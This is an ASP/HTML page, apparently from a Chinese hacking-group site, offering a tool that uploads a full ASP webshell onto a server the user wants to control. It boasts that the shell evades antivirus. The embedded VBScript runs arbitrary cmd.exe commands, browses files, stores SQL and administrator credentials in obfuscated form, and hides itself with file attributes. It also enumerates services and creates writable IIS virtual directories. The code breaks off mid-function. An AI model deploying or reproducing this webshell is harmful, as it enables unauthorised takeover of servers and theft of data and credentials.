<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html>
<head>
<title>:::在线ASP工具:::武汉黑客联盟专版:::</title>
<meta http-equiv="MSThemeCompatible" content="Yes" />
<link href="logo.ico" rel="shortcut icon" />
<meta http-equiv="Content-Language" content="zh-cn" />
<meta HTTP-EQUIV="expires" CONTENT="0" /> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta content="MSHTML 6.00.2800.1400" name="GENERATOR" />
<style type="text/css">
<!--
.style1 {color: #FF0000}
-->
</style>
</head>
<body onselectstart="return false" oncut="return false;" oncopy="return false;" bgcolor="#000000" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0">
<script src="" type="text/javascript"></script>
<style>A {
	COLOR: #ffffff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #6699cc; TEXT-DECORATION: underline
}
BODY {
	SCROLLBAR-FACE-COLOR: #000033; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: buttonface; SCROLLBAR-SHADOW-COLOR: buttonface; SCROLLBAR-3DLIGHT-COLOR: buttonhighlight; SCROLLBAR-ARROW-COLOR: #cacab7; SCROLLBAR-TRACK-COLOR: #f5f5f5; FONT-FAMILY: 宋体; SCROLLBAR-DARKSHADOW-COLOR: buttonshadow
}
UNKNOWN {
	FONT-SIZE: 9pt; FONT-FAMILY: "Verdana","Arial","宋体"
}
TD {
	FONT-SIZE: 9pt; FONT-FAMILY: 宋体,Arial,Verdana
}
FORM {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px
}
.kker {
	BORDER-RIGHT: 1px dotted; PADDING-RIGHT: 0px; BORDER-TOP: 1px dotted; PADDING-LEFT: 0px; FONT-SIZE: 9pt; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: 1px dotted; PADDING-TOP: 0px; BORDER-BOTTOM: 1px dotted; HEIGHT: 16px; BACKGROUND-COLOR: #ffffff
}
</style>
<%
dim url
url=trim(request.form("url"))
if url="" then
%>
<BR>
<table cellspacing="0" cellpadding="0" width="100%" border="0">
	<tbody>
	<tr>
		<td valign="top" align="middle">
		<table cellspacing="0" cellpadding="0" width="768" border="0">
			<tbody>
			<tr>
				<td>
				<table cellspacing="1" cellpadding="0" width="100%" bgcolor="#006699" border="0">
					<tbody>
					<tr>
						<td align="middle" bgcolor="#000000"><br />
						<font color="#ffffff">武汉黑客联盟-在线ASP工具</font> <br />
						<font color="#006699">此标签对您的系统没有任何危害,同意后即可使用 </font>
						<br />
						<br />
						<font color="#ffffff">请输入该服务端的网址:</font><form method="post" target="_blank">
							<input size="50" name="url" />
							<input type="submit" value="执行" /></form>
						<p><font color="#ffffff"><br />
						  所需的文件已经下载完成,正在准备运行,请稍候…… <br />
						  如果您的电脑允许文件下载,您也可以直接下载并运行它们</font></p>
						<p><font color="#ffffff">使用说明：将下面下载的shell.asp文件传到你要控制的服务器上，然后在上面的输入框中填写刚刚传的文件地址就行了。如：http://www.xxxxxx.com/shell.asp 然后点执行就行了。系统会自动把ASP木马传到对方服务器上。</font><span class="style1">绝对免杀！</span></p>
						<ul>
							<li><font color="#ffffff">下载: <a href="http://www.hacker365.com/down/soft/shell.rar">shell.asp</a>							文件</font> </li>
						    <li><font color="#ffffff">请将您下载完的&nbsp; <b>shell.asp </b>文件，放到您的网站的的任意目录里。</font><br />
							<br />
							<font color="#ffffff">Copyright (C) 2004 
							武汉黑客联盟 All Rights Reserved <br />
						  版权所有 任意抄袭 注意完整 NetKnave EMAIL:netknave@kacker365.com QQ:1579354</font></li>
						</ul>
						</td>
					</tr>
				</tbody>
				</table>
				</td>
			</tr>
		</tbody>
		</table>
		</td>
	</tr>
</tbody>
</table>

</body>

</html>
<%else%>

<script language="javascript">
function replace(aa,bb,cc)
  {var lpabc,lpi;
    for(lpi=0;lpi<100000;lpi++)
    { lpabc=aa;
       aa=aa.replace(bb,cc);
       if(lpabc==aa)
       return aa;
    }return aa;}
  function ccc()
  {
    var tx;tx=document.all.xb.value;
    tx=replace(tx,"_textarea","textarea");
    tx=replace(tx,"<?%","<"+"%");
    tx=replace(tx,"%?>","%"+">");
    document.all.xb.value=tx;
	return true;
    }

 </script>
 
<br />
<form name="Kker" method="POST" action="<%=url%>" onsubmit="return(ccc());">
	<p align="center"><textarea name="xb" rows="20" cols="100">
on error resume next
Session.TimeOut=1440
response.clear
Function CStrB(ByRef psUnicodeString)
	Dim lnLength
	Dim lnPosition
	lnLength = Len(psUnicodeString)
	For lnPosition = 1 To lnLength
		CStrB = CStrB &amp; ChrB(AscB(Mid(psUnicodeString, lnPosition, 1)))
	Next
End Function
Function  BtoS(Binstr)
	skipflag=0
	strC=&quot;&quot;
	If Not IsNull(binstr) Then
	lnglen=LenB(binstr)
	For i=1 To lnglen
	If skipflag=0 Then
	tmpBin=MidB(binstr,i,1)
	If AscB(tmpBin)&gt;127 Then
	strC=strC&amp;Chr(AscW(MidB(binstr,i+1,1)&amp;tmpBin))
	skipflag=1
	Else
	strC=strC&amp;Chr(AscB(tmpBin))
	End If
	Else
	skipflag=0
	End If
	Next
	End If
	BtoS  =  strC
End  Function
Function GetURL(url)
    Set Retrieval = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot;)
          With Retrieval
          .Open &quot;GET&quot;, url, false
		  .Send 
          GetURL = .responseBody
          End With
    Set Retrieval = Nothing
End Function
function eps(lpstr)eps=&quot;&quot;:for i=1 to len(lpstr)
eps=eps&amp;chr(asc(mid(lpstr,i,1))+180*256+123):next:end function
'-------------------------------------------------------------
function uep(lpstr)uep=&quot;&quot;:for i=1 to len(lpstr)
uep=uep&amp;chr(asc(mid(lpstr,i,1))-180*256-123+256*256):next:end function
if fso=&quot;&quot; then
fszjz=&quot;scripting.filesystemobject&quot;:cmdzjz=&quot;WSCRIPT.SHELL&quot;:sqluserz=&quot;sa&quot;:sqlpassz=&quot;123456&quot;:sqlhostz=&quot;(local)&quot;:hostuserz=&quot;administrator&quot;:hostpassz=&quot;123456&quot;
else
sqlhostz=uep(sh):fszjz=uep(fso):cmdzjz=uep(cmd):sqluserz=uep(su):sqlpassz=uep(sp):hostuserz=uep(hu):hostpassz=uep(hp)
end if
  if request(&quot;gl&quot;)&lt;&gt;&quot;&quot; then Session(&quot;gl&quot;)=request(&quot;gl&quot;)
  if Session(&quot;gl&quot;)=&quot;&quot; then Session(&quot;gl&quot;)=&quot;pz&quot;
  
  if request(&quot;fszjz&quot;) &lt;&gt;&quot;&quot;  then fszjz=request(&quot;fszjz&quot;)
  if request(&quot;fszjz&quot;) &lt;&gt;&quot;&quot;  then Session(&quot;fszjz&quot;)=request(&quot;fszjz&quot;)
  if Session(&quot;fszjz&quot;) &lt;&gt;&quot;&quot;  then fszjz=Session(&quot;fszjz&quot;)

  if request(&quot;sqlhostz&quot;)&lt;&gt;&quot;&quot;  then sqlhostz=request(&quot;sqlhostz&quot;)
  if request(&quot;sqlhostz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;sqlhostz&quot;)=request(&quot;sqlhostz&quot;)
  if Session(&quot;sqlhostz&quot;)&lt;&gt;&quot;&quot;  then sqlhostz=Session(&quot;sqlhostz&quot;)
  
  if request(&quot;sqluserz&quot;)&lt;&gt;&quot;&quot;  then sqluserz=request(&quot;sqluserz&quot;)
  if request(&quot;sqluserz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;sqluserz&quot;)=request(&quot;sqluserz&quot;)
  if Session(&quot;sqluserz&quot;)&lt;&gt;&quot;&quot;  then sqluserz=Session(&quot;sqluserz&quot;)
    
  if request(&quot;sqlpassz&quot;)&lt;&gt;&quot;&quot;  then sqlpassz=request(&quot;sqlpassz&quot;)
  if request(&quot;sqlpassz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;sqlpassz&quot;)=request(&quot;sqlpassz&quot;)
  if Session(&quot;sqlpassz&quot;)&lt;&gt;&quot;&quot;  then sqlpassz=Session(&quot;sqlpassz&quot;)
  
    
  if request(&quot;hostuserz&quot;)&lt;&gt;&quot;&quot;  then hostuserz=request(&quot;hostuserz&quot;)
  if request(&quot;hostuserz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;hostuserz&quot;)=request(&quot;hostuserz&quot;)
  if Session(&quot;hostuserz&quot;)&lt;&gt;&quot;&quot;  then hostuserz=Session(&quot;hostuserz&quot;)
      
  if request(&quot;hostpassz&quot;)&lt;&gt;&quot;&quot;  then hostpassz=request(&quot;hostpassz&quot;)
  if request(&quot;hostpassz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;hostpassz&quot;)=request(&quot;hostpassz&quot;)
  if Session(&quot;hostpassz&quot;)&lt;&gt;&quot;&quot;  then hostpassz=Session(&quot;hostpassz&quot;)
  
  if request(&quot;cmdzjz&quot;)&lt;&gt;&quot;&quot;  then cmdzjz=request(&quot;cmdzjz&quot;)
  if request(&quot;cmdzjz&quot;)&lt;&gt;&quot;&quot;  then Session(&quot;cmdzjz&quot;)=request(&quot;cmdzjz&quot;)
  if Session(&quot;cmdzjz&quot;)&lt;&gt;&quot;&quot;  then cmdzjz=Session(&quot;cmdzjz&quot;)
err=0
attfil=request.servervariables(&quot;PATH_TRANSLATED&quot;)
textaaa=fs.getfile(attfil).attributes
if err&lt;&gt;0 then
err=0 
set fs=server.createObject(fszjz)  
if err=0 then fszj=1
else
fszj=1
end if
err=0
Call oScript.Run (&quot;cmd.exe /c echo&quot;)
if err&lt;&gt;0 then
err=0
Set oScript = Server.CreateObject(cmdzjz)
if err=0 then cmdzj=1
else
cmdzj=1
end if
err=0
set fste=server.createObject(fszjz) 
if err=0 then testfs=1
err=0
set cmdte=server.createObject(cmdzjz)
if err=0 then testcmd=1
set fste=nothing
set cmdte=nothing
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''默认
response.write &quot;&lt;head&gt;&lt;STYLE&gt;body,td,span,div,a{FONT-SIZE:9pt;text-decoration:none}&quot;&amp;chr(13)&amp;chr(10)&amp;&quot;span,a{cursor:hand;color:blue;}hr{height:1px;line-height:1px;color:#0000ff;}&quot;&amp;chr(13)&amp;chr(10)&amp;&quot;&lt;/style&gt;&quot;
Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)  
response.write &quot;&lt;title&gt;9110085专用版---&gt;9110085制作 QQ：5910345 服务器时间：&quot;&amp;now()&amp;&quot;	&lt;/title&gt;&quot;
response.write &quot;&lt;script lanugage=&quot;&quot;JavaScript&quot;&quot;&gt;&quot;
response.write &quot;&lt;!-- &quot;
response.write &quot;function pop(pageurl)&quot;
response.write  &quot;{  var&quot;
response.write  &quot;popwin=window.open(pageurl,'popWin','scrollbars=yes,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,width=400,height=200,top=200,left=220');&quot;
response.write   &quot;return false;}&quot;
response.write   &quot;//--&gt;&quot;
response.write   &quot;&lt;/script&gt;&quot;
response.write &quot;&lt;/head&gt;&quot;
response.write &quot;&lt;body topmargin='0' leftmargin='0'&gt;&quot;
Server.ScriptTimeout=999999

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''配置
if Session(&quot;gl&quot;)=&quot;pz&quot;   then
attfil=request.servervariables(&quot;PATH_TRANSLATED&quot;)
if fszj=1 then
	fs.getfile(attfil).attributes=39
else
	if cmdzj=1 then Call oScript.Run (&quot;cmd.exe /c attrib +s +a +r +h &quot; &amp; attfil )
end if
if testfs=1 then response.write &quot;&lt;br&gt;&lt;font color='#FF0000'&gt;恭喜:&lt;/font&gt;本空间支持FSO&quot;
if testcmd=1 then response.write &quot;,本空间支持cmd执行任意命令&quot;
response.write &quot;&lt;div align=center&gt;&quot;
if fszj=1 then response.write &quot;请选择您的操作： &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=dir target='_self' title='磁盘管理'&gt;磁盘管理&lt;/a&gt;&quot;
if cmdzj=1 then response.write &quot; | &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=cmd target='_self' title='CMD命令'&gt;CMD命令&lt;/a&gt;&quot;
response.write &quot; | &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=sql target='_self' title='MSSQL管理'&gt;MSSQL管理&lt;/a&gt;&quot;
response.write &quot; | &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=nofso target='_self' title='免FSO上传'&gt;免FSO上传&lt;/a&gt;&quot;
'response.write &quot;  &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=vdir target='_self'&gt;虚拟&lt;/a&gt;&quot;
'response.write &quot;  &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=zh target='_self'&gt;帐号&lt;/a&gt;&quot;
response.write &quot;&lt;/div&gt;&quot;
response.write &quot;&lt;FORM action=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?&quot;&amp;request.querystring&amp;&quot; method=POST&gt;FS0组建:&lt;input type=text name='fszjz' size=40 value='&quot;&amp;fszjz&amp;&quot;'&gt;CMD组建:&lt;input type=text name='cmdzjz' size=40 value='&quot;&amp;cmdzjz&amp;&quot;'&gt;&lt;br&gt;SQLUser:&lt;input type=text name='sqluserz' size=40 value='&quot;&amp;sqluserz&amp;&quot;'&gt;sqlpass:&lt;input type=text name='sqlpassz' size=40 value='&quot;&amp;sqlpassz&amp;&quot;'&gt;&lt;br&gt;hosuser:&lt;input type=text name='hostuserz' size=40 value='&quot;&amp;hostuserz&amp;&quot;'&gt;hospass:&lt;input type=text name='hostpassz' size=40 value='&quot;&amp;hostpassz&amp;&quot;'&gt;&lt;br&gt;sqlhost:&lt;input type=text name='sqlhostz' size=40 value='&quot;&amp;sqlhostz&amp;&quot;'&gt;&lt;input type=submit value='设置'&gt;---------&lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=bc target='_self'&gt;保存&lt;/a&gt;--------&lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=bc&amp;mr=y target='_self'&gt;默认保存&lt;/a&gt;&lt;/FORM&gt;&lt;PRE&gt;&lt;br&gt;&quot;

response.write&quot;&lt;table border=0 width=500 cellspacing=0 cellpadding=0 class='noborder'&gt;&quot;
response.write&quot;&lt;tr&gt;&lt;td&gt;&lt;table border=0 width=100% cellspacing=1 cellpadding=0 class=noborder&gt;&quot;
response.write&quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&quot;
response.write&quot;&lt;td width='59%' align=left&gt; 服务器名&lt;/td&gt;&quot;
response.write&quot;&lt;td width=41% bgcolor=#EEEEEE&gt; &quot; &amp; Request.ServerVariables(&quot;SERVER_NAME&quot;) &amp; &quot;&lt;/td&gt;&lt;/tr&gt;&quot;
response.write&quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 服务器IP&lt;/td&gt;&lt;td&gt; &quot;
response.write Request.ServerVariables(&quot;LOCAL_ADDR&quot;)
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&quot;
response.write &quot;&lt;td align=left&gt; 服务器端口&lt;/td&gt;&lt;td&gt; &quot;
response.write Request.ServerVariables(&quot;SERVER_PORT&quot;)
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&quot;

response.write &quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 机器名&lt;/td&gt;&lt;td&gt; &quot;
response.write oScriptNet.ComputerName
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&quot;

response.write &quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 帐号&lt;/td&gt;&lt;td&gt; &quot;
response.write oScriptNet.UserName
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&quot;

response.write &quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; WEB路径&lt;/td&gt;&lt;td&gt; &quot;
response.write request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;)
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&quot;

response.write &quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; ADSIPath&lt;/td&gt;&lt;td&gt; &quot;
response.write request.servervariables(&quot;APPL_MD_PATH&quot;)
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&quot;


response.write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 本文件绝对路径&lt;/td&gt;&lt;td&gt; &quot;
response.write server.mappath(Request.ServerVariables(&quot;SCRIPT_NAME&quot;))
response.write &quot;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 服务器时间&lt;/td&gt;&lt;td&gt; &quot;
response.write now
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 服务器CPU数量&lt;/td&gt;&lt;td&gt; &quot;
response.write  Request.ServerVariables(&quot;NUMBER_OF_PROCESSORS&quot;)
response.write &quot;个&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 服务器操作系统&lt;/td&gt;&lt;td&gt; &quot;
response.write Request.ServerVariables(&quot;OS&quot;)
response.write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&lt;td align=left&gt; 客户端IP: 端口 [代理]&lt;/td&gt;&lt;td&gt; &quot;
response.write Request.ServerVariables(&quot;REMOTE_ADDR&quot;) &amp; &quot;|&quot; &amp; Request.ServerVariables(&quot;REMOTE_PORT&quot;) &amp; &quot;[&quot; &amp; Request.ServerVariables(&quot;HTTP_X_FORWARDED_FOR&quot;)
response.write &quot;]&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor=#EEEEEE height=18 class=noborder&gt;&quot;
dim t1,t2,lsabc,thetime
t1=timer
for i=1 to 500000
lsabc= 1 + 1
next
t2=timer
thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)

response.write &quot;&lt;td align=left&gt; 服务器运算速度测试&lt;/td&gt;&lt;td&gt; &lt;font color=red&gt;&quot; &amp; thetime &amp; &quot;毫秒&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;

on error resume next
response.write&quot;&lt;BR&gt;&lt;BR&gt;&lt;div align=center&gt;&lt;font color='#FF0000'&gt;====================================================以下是这台计算机的进程表====================================================&lt;/font&gt;&lt;/div&gt;&lt;BR&gt;&quot;
set domainObject = GetObject(&quot;WinNT://.&quot;)
for each obj in domainObject
  if  mid(obj.path,4,3) &lt;&gt;&quot;win&quot; and mid(obj.path,4,3) &lt;&gt;&quot;WIN&quot; and OBJ.StartType=2 then
 N2=N2&amp;obj.Name&amp;&quot;--&quot;&amp;obj.DisplayName &amp;&quot;--&quot;&amp;OBJ.StartType&amp;&quot;&lt;br&gt;&lt;font color=#FF0000&gt;&quot;&amp;obj.path&amp; &quot;&lt;/font&gt;&lt;br&gt;&lt;BR&gt;&quot;
  else
 N1=N1&amp;obj.Name&amp;&quot;--&quot;&amp;obj.DisplayName &amp;&quot;--&quot;&amp;OBJ.StartType&amp;&quot;&lt;br&gt;&lt;font color=#008000&gt;&quot;&amp;obj.path&amp; &quot;&lt;/font&gt;&lt;br&gt;&lt;BR&gt;&quot;
  end if
next
set domainObject=nothing
RESPONSE.WRITE N2&amp;N1
response.write&quot;&lt;BR&gt;&lt;div align=center&gt;&lt;font color='#FF0000'&gt;====================================================以上是这台计算机的进程表====================================================&lt;/font&gt;&lt;/div&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&quot;
response.end
end if 

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''保存
if Session(&quot;gl&quot;)=&quot;bc&quot;   then
attfil=request.servervariables(&quot;PATH_TRANSLATED&quot;)
Set f = fs.OpenTextFile(attfil, 1, 0, 0)
code = f.ReadAll
codes=split(code,&quot;&lt;!&quot;&amp;&quot;了&gt;&quot;)
olds=codes(1)
news=&quot;&lt;&quot;&amp;&quot;%fso=&quot;&quot;&quot;&amp;eps(fszjz)&amp;&quot;&quot;&quot;:cmd=&quot;&quot;&quot;&amp;eps(cmdzjz)&amp;&quot;&quot;&quot;:sh=&quot;&quot;&quot;&amp;eps(sqlhostz)&amp;&quot;&quot;&quot;:su=&quot;&quot;&quot;&amp;eps(sqluserz)&amp;&quot;&quot;&quot;:sp=&quot;&quot;&quot;&amp;eps(sqlpassz)&amp;&quot;&quot;&quot;:hu=&quot;&quot;&quot;&amp;eps(hostuserz)&amp;&quot;&quot;&quot;:hp=&quot;&quot;&quot;&amp;eps(hostpassz)&amp;&quot;&quot;&quot;%&quot;&amp;&quot;&gt;&quot;
if request(&quot;mr&quot;)=&quot;y&quot; then news=&quot;&lt;!@&gt;&quot;
if testfs&lt;&gt;1 then news=&quot;&lt;object id=fs RUNAT=SERVER  classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'&gt;&lt;/object&gt;&quot;&amp;news
if testcmd&lt;&gt;1 then news=&quot;&lt;object id=oScript RUNAT=SERVER  classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'&gt;&lt;/object&gt;&quot;&amp;news
newcode=replace(code,olds,news)
fs.getfile(attfil).attributes=0
fs.createtextfile(attfil,1).write newcode
fs.getfile(attfil).attributes=39
response.write &quot;&lt;script  LANGUAGE=javascript&gt;&quot;
response.write &quot;window.location.replace('&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz');&quot; 
response.write &quot;&lt;/script&gt;&quot; 
response.end
end if 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''帐号
if Session(&quot;gl&quot;)=&quot;zh&quot;   then
Response.Status=&quot;401 Unauthorized&quot;
response.write &quot;&lt;script  LANGUAGE=javascript&gt;&quot;
response.write &quot;window.location.replace('&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz');&quot; 
response.write &quot;&lt;/script&gt;&quot; 
response.end
end if 
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''虚拟目录
if Session(&quot;gl&quot;)=&quot;vdir&quot;   then
response.write &quot;&lt;BR&gt;&lt;FORM action=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?&quot;&amp;request.querystring&amp;&quot; method=POST&gt;name1:&lt;input type=text name='name1' size=10 value='vtjg\'&gt;name2:&lt;input type=text name='name2' size=10 value='wtjg\'&gt;WEBNO:&lt;input type=text name='webno' size=3 value='1'&gt;方式(建立—删除)：&lt;input type='checkbox' name='ms' value='1' checked&gt;&lt;input type=submit value='运行'&gt;   &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz target='_self'&gt;返回&lt;/a&gt;&lt;/FORM&gt;&lt;PRE&gt;&quot;
if request(&quot;webno&quot;)&lt;&gt;&quot;&quot; then 
webno=request(&quot;webno&quot;) 
ms=request(&quot;ms&quot;)
name1=request(&quot;name1&quot;)
name2=request(&quot;name2&quot;)
err=0
for y=0 to 1
doc=y
for x=3 to 26
vpath=chr(64+x)&amp;&quot;:\&quot; 
if y=0 then name=name1&amp;chr(64+x) 
if y=1 then name=name2&amp;chr(64+x) 
if ms=1 then
iscreate=CreateWebVDir(vpath,webno,name) 
else
iscreate=DELETEWebVDir(webno,name)
end if
next
next
if err=0 then 
response.write &quot;执行成功！&quot;
else
response.write &quot;执行失败！&quot;
end if
Function CreateWebVDir(VDir,WNumber,VDname) 
VDirName=&quot;vdir&quot; 
Set ServerObj = GetObject(&quot;IIS://127.0.0.1/W3SVC/&quot;&amp;WNumber&amp;&quot;/ROOT&quot;) 
Set VDirObj = ServerObj.Create(&quot;IIsWebVirtualDir&quot;, VDName) 
VDirObj.Path = VDir 
vdirObj.AuthFlags = 5
if doc=0 then
vdirObj.AccessSource = 1
vdirObj.AccessRead = 1
vdirObj.AccessWrite = 1
vdirObj.DirBrowseShowLongDate = 1
vdirObj.EnableDirBrowsing = 1
vdirObj.DirBrowseShowDate = 1
vdirObj.DirBrowseShowTime = 1
vdirObj.DirBrowseShowSize = 1
vdirObj.DirBrowseShowExtension = 1
else
vdirObj.DirBrowseFlags = &amp;H4000003E
vdirObj.AccessFlags = 515
vdirObj.AspEnableParentPaths=1
end if
VDirObj.EnableDefaultDoc=doc 
VDirObj.AppFriendlyName=name
VDirObj.AppIsolated=&quot;2&quot;
VDirObj.AppRoot=&quot;/LM/W3SVC/&quot;&amp;WNumber&amp;&quot;/Root/&quot;&amp;name
VDirObj.SetInfo 
Set VDirObj=Nothing 
Set ServerObj=Nothing 
End Function 
Function DELETEWebVDir(WNumber,VDname) 
Set ServerObj = GetObject(&quot;IIS://127.0.0.1/W3SVC/&quot;&amp;WNumber&amp;&quot;/ROOT&quot;) 
Set VDirObj = ServerObj.DELETE(&quot;IIsWebVirtualDir&quot;, VDName) 
Set VDirObj=Nothing 
Set ServerObj=Nothing 
End Function 
end if
response.end
end if 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''命令方式
if Session(&quot;gl&quot;)=&quot;cmd&quot;   then 
szCMD =Request.Form(&quot;.CMD&quot;)
szCMD1 =Server.HTMLEncode(Request.Form(&quot;.CMD&quot;))
If (szCMD &lt;&gt; &quot;&quot;) Then
file=left(now(),4)&amp;right(now(),2)&amp;&quot;cc.txt&quot;
szTempFile =server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&amp;file
szTempFiles=server.mappath(&quot;.&quot;)&amp;&quot;\*cc.txt&quot;
if request(&quot;xs&quot;)=&quot;on&quot; then
if request(&quot;yx&quot;)&lt;&gt;&quot;on&quot; then
Call oScript.Run (&quot;cmd.exe /c &quot; &amp; szCMD &amp; &quot; &gt; &quot; &amp; szTempFile, 0, True)
else
Call oScript.Run (szCMD &amp; &quot; &gt; &quot; &amp; szTempFile, 0, True)
end if 
else
if request(&quot;yx&quot;)&lt;&gt;&quot;on&quot; then
Call oScript.Run (&quot;cmd.exe /c &quot; &amp; szCMD )
else
Call oScript.Run (szCMD )
end if
end if
End If
response.write &quot;&lt;BR&gt;执行任意CMD命令&quot;
response.write &quot; &lt;FORM action=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?&quot;&amp;request.querystring&amp;&quot; method=POST&gt;&lt;input type=text name='.CMD' size=65 value=&quot;&quot;&quot;&amp;szCMD1&amp;&quot;&quot;&quot;&gt;显示：&lt;input type='checkbox' name='xs' value='on' checked&gt;程序：&lt;input type='checkbox' name='yx' value='on' &gt;&lt;input type=submit value='运行'&gt;   &lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz target='_self'&gt;返回&lt;/a&gt;&lt;/FORM&gt;&lt;PRE&gt;&quot;
if request(&quot;xs&quot;)=&quot;on&quot; then
response.flush
response.write &quot;&lt;_textarea name=xb rows=26 cols=108 &gt;&quot;
response.flush
if left(szcmd,5)=&quot;type &quot; or left(szcmd,5)=&quot;TYPE &quot; then 
tt=&quot;http://&quot;&amp;Request(&quot;http_host&quot;)&amp;Request(&quot;URL&quot;)&amp;&quot;/../&quot;&amp;file
BINS=BtoS(GetUrl(tt))
BINS=replace(bins,&quot;&lt;/text&quot;&amp;&quot;area&gt;&quot;,&quot;&lt;/_text&quot;&amp;&quot;area&gt;&quot;)
BINS=replace(bins,&quot;&lt;/TEXT&quot;&amp;&quot;AREA&gt;&quot;,&quot;&lt;/text&quot;&amp;&quot;area&gt;&quot;)
response.write BINS
else 
response.write server.execute(file)
end if
response.write &quot;&lt;/_textarea&gt;&quot;
response.flush
response.write &quot;&lt;script&gt;&quot;
response.write &quot;function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi&lt;100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}&quot;
response.write &quot;function ccc()&quot;
response.write &quot;{&quot;
response.write &quot;var tx;&quot;
response.write &quot;tx=document.all.xb.value;&quot;
response.write &quot;tx=replace(tx,&quot;&quot;_te&quot;+&quot;xtarea&quot;&quot;,&quot;&quot;_textarea&quot;&quot;);&quot;
response.write &quot;document.all.xb.value=tx;&quot;
response.write &quot;}&quot;
response.write &quot;ccc();&quot;
response.write &quot;&lt;/script&gt;&quot;
Call oScript.Run (&quot;cmd.exe /c del &quot; &amp; szTempFiles&amp;&quot; /f /q&quot; )
end if
response.end
end if
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''文件方式
if Session(&quot;gl&quot;)=&quot;dir&quot; then
aduser=uep(&quot;窜&quot;):adpass=uep(&quot;摧&quot;):sahost=uep(&quot;船喘床穿传穿传穿船&quot;):sauser=uep(&quot;打歹歹&quot;):sapass=uep(&quot;船串创床窗串串串疮闯传殆殆&quot;):imgp=uep(&quot;淬达达措吹椽椽崔翠达呆穿传床串串穿崔搓磋椽大歹搭催椽寸翠摧错窜错呆椽错脆崔呆崔寸脆催椽翠磋窜粹脆搭椽&quot;)
fso=uep(&quot;搭崔错翠措达翠撮粹穿瘁翠寸脆搭呆搭达脆磋搓摧村脆崔达&quot;)
